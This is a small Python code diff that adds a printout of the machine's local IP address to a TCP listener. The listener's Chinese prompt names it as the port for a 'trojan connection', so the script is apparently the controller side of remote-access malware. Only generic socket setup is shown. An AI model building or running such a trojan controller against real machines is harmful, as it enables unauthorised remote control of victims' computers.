@@ -1,5 +1,8 @@
 import socket
 
+local_ip = socket.gethostbyname(socket.gethostname())
+print("本机IP地址:", local_ip)
+
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind(('0.0.0.0', int(input("输入木马连接的端口号："))))
 server_socket.listen(5)
